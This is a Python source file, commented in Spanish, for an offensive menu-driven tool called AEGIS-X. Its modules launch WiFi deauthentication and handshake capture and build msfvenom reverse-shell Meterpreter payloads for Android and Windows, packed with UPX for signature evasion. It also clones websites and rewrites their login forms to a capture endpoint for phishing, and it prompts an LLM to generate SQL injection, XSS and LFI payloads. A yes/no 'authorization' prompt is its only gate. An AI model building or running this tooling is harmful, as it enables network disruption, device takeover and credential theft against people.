#!/usr/bin/env python3
"""
AEGIS-X: Advanced Ethical Guard & Intelligence System for X-ploitation
Autor: Senior Offensive Security Architect
Versión: 1.0.0
Licencia: Educational Use Only
"""

import os
import sys
import re
import time
import json
import signal
import argparse
import subprocess
import threading
from datetime import datetime
from pathlib import Path

# Librerías de terceros
try:
    from colorama import Fore, Back, Style, init as colorama_init
    import requests
    from dotenv import load_dotenv
except ImportError:
    print("[!] Error: Faltan dependencias. Ejecuta: pip install -r requirements.txt")
    sys.exit(1)

# Inicializar colores
colorama_init(autoreset=True)

# Configuración Global
LOG_DIR = "/var/log/aegis-x"
OPENROUTER_URL = "https://openrouter.ai/api/v1/chat/completions"

class AegisX:
    def __init__(self):
        self.api_key = self._load_api_key()
        self.session_id = datetime.now().strftime("%Y%m%d_%H%M%S")
        self._setup_logging()
        self.banner()

    def _load_api_key(self):
        """Carga la API Key de OpenRouter desde .env o variables de entorno."""
        load_dotenv()
        key = os.getenv("OPENROUTER_API_KEY")
        if not key:
            print(f"{Fore.YELLOW}[WARN] OPENROUTER_API_KEY no encontrada. El Módulo 4 (IA) estará limitado.{Style.RESET_ALL}")
        return key

    def _setup_logging(self):
        """Crea el directorio de logs si no existe."""
        try:
            if not os.path.exists(LOG_DIR):
                os.makedirs(LOG_DIR)
                print(f"{Fore.GREEN}[+] Directorio de logs creado: {LOG_DIR}{Style.RESET_ALL}")
        except PermissionError:
            print(f"{Fore.RED}[!] Error: No hay permisos para escribir en {LOG_DIR}. Ejecuta como root.{Style.RESET_ALL}")
            sys.exit(1)

    def log_action(self, module, message):
        """Guarda acciones en el log."""
        log_file = os.path.join(LOG_DIR, f"aegis_{self.session_id}.log")
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        entry = f"[{timestamp}] [{module.upper()}] {message}\n"
        with open(log_file, "a") as f:
            f.write(entry)

    def banner(self):
        """Muestra el banner de la herramienta."""
        print(f"""
{Fore.CYAN}
  ___   _____  ________      ________      ________      
 /   | / ___/ / ____/ /     / ____/ /_    / ____/ /_     
/ /| | \\__ \\ / /_  / /     / /   / __ \\  / /_  / __ \\   
/ ___ |___/ // __/ / /___  / /___/ / / / / __/ / / / /   
/_/  |_/____//_/   /_____/  \\____/_/ /_/ /_/   /_/ /_/    
                                                        
{Fore.WHITE}Advanced Ethical Guard & Intelligence System for X-ploitation
{Fore.YELLOW}v1.0.0 - For Authorized Audits Only
{Style.RESET_ALL}
        """)

    def ethical_check(self, action_name):
        """
        Pausa crítica: Verificación de autorización legal.
        Se ejecuta antes de cualquier acción ofensiva.
        """
        print(f"\n{Back.RED}{Fore.WHITE}⚠️  ADVERTENCIA LEGAL: Vas a ejecutar: {action_name}  {Style.RESET_ALL}")
        print(f"{Fore.YELLOW}Esta acción puede ser ilegal sin autorización explícita por escrito.{Style.RESET_ALL}")
        response = input(f"{Fore.CYAN}¿Tienes autorización por escrita para auditar este objetivo? (s/N): {Style.RESET_ALL}").lower()
        
        if response != 's' and response != 'si':
            print(f"{Fore.RED}[!] Acción cancelada por falta de confirmación ética.{Style.RESET_ALL}")
            self.log_action("ETHICAL_CHECK", f"Acción '{action_name}' cancelada por el usuario.")
            return False
        
        self.log_action("ETHICAL_CHECK", f"Acción '{action_name}' autorizada por el usuario.")
        return True

    def check_dependencies(self, tools):
        """Verifica si las herramientas del sistema están instaladas."""
        missing = []
        for tool in tools:
            if subprocess.call(['which', tool], stdout=subprocess.PIPE, stderr=subprocess.PIPE) != 0:
                missing.append(tool)
        
        if missing:
            print(f"{Fore.RED}[!] Herramientas faltantes: {', '.join(missing)}{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}[*] Instala las dependencias necesarias en Kali Linux.{Style.RESET_ALL}")
            return False
        return True

    # ------------------------------------------------------------------
    # MÓDULO 1: WiFi Auditing Avanzado
    # ------------------------------------------------------------------
    def module_wifi(self):
        print(f"\n{Fore.CYAN}--- MÓDULO 1: WiFi Auditing ---{Style.RESET_ALL}")
        interface = input("[*] Interfaz de red (ej. wlan0mon): ")
        
        if not self.check_dependencies(['airodump-ng', 'aireplay-ng']):
            return

        print("1. Escanear Redes (Monitor Mode)")
        print("2. Ataque Deauth (DoS Test)")
        print("3. Capturar Handshake & Fuerza Bruta")
        choice = input("[>] Opción: ")

        if choice == '1':
            if not self.ethical_check("Escaneo Pasivo WiFi"): return
            self._wifi_scan(interface)
        elif choice == '2':
            if not self.ethical_check("Ataque Deautenticación WiFi"): return
            target_bssid = input("[*] BSSID Objetivo: ")
            count = input("[*] Número de paquetes (0 = infinito): ")
            self._wifi_deauth(interface, target_bssid, count)
        elif choice == '3':
            if not self.ethical_check("Captura Handshake WPA"): return
            target_bssid = input("[*] BSSID Objetivo: ")
            channel = input("[*] Canal: ")
            self._wifi_handshake(interface, target_bssid, channel)

    def _wifi_scan(self, interface):
        print(f"{Fore.GREEN}[*] Iniciando escaneo... Presiona Ctrl+C para detener.{Style.RESET_ALL}")
        try:
            cmd = ['airodump-ng', interface]
            process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            for line in process.stdout:
                print(line.strip())
        except KeyboardInterrupt:
            process.terminate()
            print("\n[+] Escaneo detenido.")

    def _wifi_deauth(self, interface, bssid, count):
        print(f"{Fore.RED}[*] Lanzando deautenticación contra {bssid}...{Style.RESET_ALL}")
        cmd = ['aireplay-ng', '--deauth', count, '-a', bssid, interface]
        try:
            # Timeout para evitar bloqueo infinito
            subprocess.run(cmd, timeout=60) 
        except subprocess.TimeoutExpired:
            print("\n[+] Tiempo límite alcanzado. Deteniendo ataque.")
        except Exception as e:
            print(f"[!] Error: {e}")

    def _wifi_handshake(self, interface, bssid, channel):
        output_file = f"/tmp/handshake_{bssid.replace(':','')}.cap"
        print(f"[*] Capturando handshake en {output_file}...")
        
        # Paso 1: Captura pasiva
        cmd_dump = ['airodump-ng', '-c', channel, '--bssid', bssid, '-w', output_file.replace('.cap',''), interface]
        
        # Paso 2: Forzar handshake (Deauth breve)
        cmd_deauth = ['aireplay-ng', '--deauth', '5', '-a', bssid, interface]

        print("[*] Esperando handshake... (Abre otra terminal para deauth si es necesario)")
        try:
            # En un script real, esto debería ser asíncrono. Aquí simplificado.
            subprocess.run(cmd_deauth, timeout=10)
            print("[+] Paquetes de deauth enviados. Revisa si el handshake fue capturado.")
            # Nota: La fuerza bruta con aircrack-ng requeriría un diccionario
        except Exception as e:
            print(f"[!] Error en captura: {e}")

    # ------------------------------------------------------------------
    # MÓDULO 2: Generación de Payloads (Sandbox)
    # ------------------------------------------------------------------
    def module_payloads(self):
        print(f"\n{Fore.CYAN}--- MÓDULO 2: Payload Generation (Sandbox) ---{Style.RESET_ALL}")
        
        if not self.check_dependencies(['msfvenom', 'upx']):
            return

        print("1. Android APK (C2 Connect)")
        print("2. Windows EXE (Process Hollowing Theory)")
        choice = input("[>] Opción: ")

        if not self.ethical_check("Generación de Payload Malicioso"): return

        lhost = input("[*] LHOST (Tu IP): ")
        lport = input("[*] LPORT: ")

        if choice == '1':
            outfile = "payload_test.apk"
            print(f"[*] Generando APK para Android...")
            cmd = [
                'msfvenom', '-p', 'android/meterpreter/reverse_tcp',
                'LHOST='+lhost, 'LPORT='+lport, '-o', outfile
            ]
            self._run_subprocess(cmd)
            
        elif choice == '2':
            outfile = "payload_test.exe"
            icon_pdf = "/usr/share/icons/hicolor/48x48/apps/pdf.png" # Ruta ejemplo
            print(f"[*] Generando EXE para Windows (Teórico)...")
            
            # Generar shellcode raw
            cmd_gen = [
                'msfvenom', '-p', 'windows/x64/meterpreter/reverse_tcp',
                'LHOST='+lhost, 'LPORT='+lport, '-f', 'raw', '-o', '/tmp/shell.raw'
            ]
            self._run_subprocess(cmd_gen)
            
            # Empaquetar con UPX y cambiar icono (simulado con resource hacker o similar, aquí solo UPX)
            # Nota: Cambiar iconos requiere herramientas como rcedit.exe en wine o recursos de Python
            print("[*] Comprimiendo con UPX para evasión básica de firma...")
            cmd_upx = ['upx', '/tmp/shell.raw', '-o', outfile]
            self._run_subprocess(cmd_upx)

    def _run_subprocess(self, cmd):
        try:
            result = subprocess.run(cmd, capture_output=True, text=True, check=True)
            print(f"{Fore.GREEN}[+] Comando ejecutado correctamente.{Style.RESET_ALL}")
            if result.stdout: print(result.stdout)
        except subprocess.CalledProcessError as e:
            print(f"{Fore.RED}[!] Error al ejecutar comando: {e.stderr}{Style.RESET_ALL}")

    # ------------------------------------------------------------------
    # MÓDULO 3: Clonación de Websites (Phishing Controlado)
    # ------------------------------------------------------------------
    def module_clone(self):
        print(f"\n{Fore.CYAN}--- MÓDULO 3: Web Cloning (OSINT/Phishing Lab) ---{Style.RESET_ALL}")
        
        if not self.ethical_check("Clonación de Sitio Web"): return
        
        url = input("[*] URL Objetivo (ej. http://testphp.vulnweb.com): ")
        folder = input("[*] Nombre de carpeta local: ")
        
        print("[*] Descargando sitio con wget...")
        cmd = ['wget', '--mirror', '--convert-links', '--adjust-extension', '--page-requisites', '--no-parent', '-P', folder, url]
        
        try:
            subprocess.run(cmd, timeout=120)
            print(f"[+] Sitio descargado en ./{folder}")
            
            # Modificación simple de formularios para demo
            self._modify_forms(folder)
            
            print("[*] Para levantar el servidor de captura, usa: python3 -m http.server 8080 -d " + folder)
            print("[*] Configura tu listener en Netcat o Flask para recibir los POSTs.")
            
        except Exception as e:
            print(f"[!] Error clonando: {e}")

    def _modify_forms(self, folder):
        """Busca archivos HTML y cambia la acción del formulario a localhost."""
        import glob
        html_files = glob.glob(f"{folder}/**/*.html", recursive=True)
        for fpath in html_files:
            try:
                with open(fpath, 'r') as f:
                    content = f.read()
                # Reemplazo básico regex
                new_content = re.sub(r'action=["\']([^"\']*)["\']', 'action="http://localhost:8080/capture"', content)
                with open(fpath, 'w') as f:
                    f.write(new_content)
            except:
                pass

    # ------------------------------------------------------------------
    # MÓDULO 4: Pentesting Web con IA (OpenRouter)
    # ------------------------------------------------------------------
    def module_ai_pentest(self):
        print(f"\n{Fore.CYAN}--- MÓDULO 4: AI-Powered Web Pentesting ---{Style.RESET_ALL}")
        
        if not self.api_key:
            print(f"{Fore.RED}[!] Error: API Key de OpenRouter no configurada. Revisa tu archivo .env{Style.RESET_ALL}")
            return

        print("1. Generar Payloads Inteligentes (SQLi/XSS)")
        print("2. Analizar Encabezados de Seguridad")
        print("3. Analizar Reporte ZAP (JSON)")
        choice = input("[>] Opción: ")

        if choice == '1':
            url = input("[*] URL con parámetros (ej. http://site.com/id=1): ")
            self._ai_generate_payloads(url)
        elif choice == '2':
            url = input("[*] URL Objetivo: ")
            self._ai_analyze_headers(url)
        elif choice == '3':
            file_path = input("[*] Ruta al reporte JSON de ZAP: ")
            self._ai_analyze_zap_report(file_path)

    def consultar_openrouter(self, prompt_usuario, sistema="Eres un asistente experto en ciberseguridad ofensiva. Responde de forma técnica y concisa."):
        """Función central para interactuar con OpenRouter."""
        headers = {
            "Authorization": f"Bearer {self.api_key}",
            "Content-Type": "application/json",
            "HTTP-Referer": "http://localhost/aegis-x",
            "X-Title": "Aegis-X Pentesting Tool"
        }
        
        # Selección de modelo gratuito/eficiente
        data = {
            "model": "mistralai/mistral-7b-instruct", 
            "messages": [
                {"role": "system", "content": sistema},
                {"role": "user", "content": prompt_usuario}
            ],
            "temperature": 0.7
        }

        try:
            print(f"{Fore.YELLOW}[*] Consultando IA...{Style.RESET_ALL}")
            response = requests.post(OPENROUTER_URL, headers=headers, json=data, timeout=45)
            response.raise_for_status()
            result = response.json()
            
            if 'choices' in result and len(result['choices']) > 0:
                return result['choices'][0]['message']['content']
            else:
                return "[ERROR] Respuesta vacía de la API."
                
        except requests.exceptions.HTTPError as errh:
            return f"[ERROR HTTP] {errh}"
        except requests.exceptions.ConnectionError as errc:
            return f"[ERROR Conexión] {errc}"
        except requests.exceptions.Timeout as errt:
            return f"[ERROR Timeout] La API tardó demasiado. Intenta de nuevo."
        except Exception as e:
            return f"[ERROR General] Falló la consulta a OpenRouter: {str(e)}"

    def _ai_generate_payloads(self, url):
        prompt = f"""
        Analiza la siguiente URL: {url}
        Identifica posibles puntos de inyección (parámetros GET/POST).
        Genera 3 payloads específicos para:
        1. SQL Injection (Boolean-based blind)
        2. XSS Reflejado
        3. Local File Inclusion (LFI)
        Explica brevemente por qué cada payload podría funcionar en este contexto.
        """
        respuesta = self.consultar_openrouter(prompt)
        print(f"\n{Fore.GREEN}--- Resultado IA ---{Style.RESET_ALL}\n{respuesta}")

    def _ai_analyze_headers(self, url):
        try:
            resp = requests.get(url, timeout=10)
            headers_dict = dict(resp.headers)
            prompt = f"""
            Analiza los siguientes encabezados HTTP de {url} desde una perspectiva de seguridad:
            {json.dumps(headers_dict, indent=2)}
            
            Identifica configuraciones erróneas (ej. falta de CSP, HSTS, X-Frame-Options).
            Prioriza los riesgos de alto a bajo.
            """
            respuesta = self.consultar_openrouter(prompt)
            print(f"\n{Fore.GREEN}--- Análisis de Encabezados ---{Style.RESET_ALL}\n{respuesta}")
        except Exception as e:
            print(f"[!] No se pudo conectar a la URL: {e}")

    def _ai_analyze_zap_report(self, file_path):
        try:
            with open(file_path, 'r') as f:
                zap_data = json.load(f)
            
            # Extraer solo alertas críticas/high para no saturar el contexto
            alerts = zap_data.get('site', [{}])[0].get('alerts', [])
            critical_alerts = [a for a in alerts if a.get('riskcode') in ['3', '2']] # High/Medium
            
            if not critical_alerts:
                print("[*] No se encontraron alertas de riesgo alto/medio en el JSON.")
                return

            prompt = f"""
            Actúa como un Lead Pentester. Analiza el siguiente resumen de vulnerabilidades encontradas por OWASP ZAP:
            {json.dumps(critical_alerts[:5], indent=2)} # Limitamos a 5 para el prompt
            
            Genera un informe ejecutivo resumido:
            1. Vulnerabilidad más crítica.
            2. Impacto potencial.
            3. Recomendación de remediación técnica.
            """
            respuesta = self.consultar_openrouter(prompt)
            print(f"\n{Fore.GREEN}--- Informe IA sobre ZAP ---{Style.RESET_ALL}\n{respuesta}")
            
        except Exception as e:
            print(f"[!] Error leyendo reporte ZAP: {e}")

def main():
    parser = argparse.ArgumentParser(description='Aegis-X: Advanced Ethical Pentesting Tool')
    parser.add_argument('--wifi', action='store_true', help='Iniciar módulo WiFi')
    parser.add_argument('--interface', type=str, help='Interfaz de red para WiFi')
    
    args = parser.parse_args()
    
    # Instancia principal
    aegis = AegisX()
    
    if args.wifi:
        if args.interface:
            # Ejecución directa por terminal
            aegis.module_wifi() # Aquí podrías pasar el argumento específico
        else:
            print("[!] Debes especificar --interface wlan0mon")
    else:
        # Menú Interactivo
        while True:
            print(f"\n{Fore.CYAN}=== MENÚ PRINCIPAL ==={Style.RESET_ALL}")
            print("1. WiFi Auditing")
            print("2. Payload Generation")
            print("3. Web Cloning")
            print("4. AI Pentesting (OpenRouter)")
            print("0. Salir")
            
            choice = input("[>] Selecciona una opción: ")
            
            if choice == '1':
                aegis.module_wifi()
            elif choice == '2':
                aegis.module_payloads()
            elif choice == '3':
                aegis.module_clone()
            elif choice == '4':
                aegis.module_ai_pentest()
            elif choice == '0':
                print(f"{Fore.GREEN}[*] Saliendo de Aegis-X. Mantén la ética.{Style.RESET_ALL}")
                break
            else:
                print(f"{Fore.RED}[!] Opción inválida.{Style.RESET_ALL}")

if __name__ == "__main__":
    # Verificar root
    if os.geteuid() != 0:
        print(f"{Fore.RED}[!] Aegis-X requiere privilegios de root para módulos de red.{Style.RESET_ALL}")
        # No salimos forzadamente para permitir pruebas de IA/Web sin root, pero advertimos
    
    main()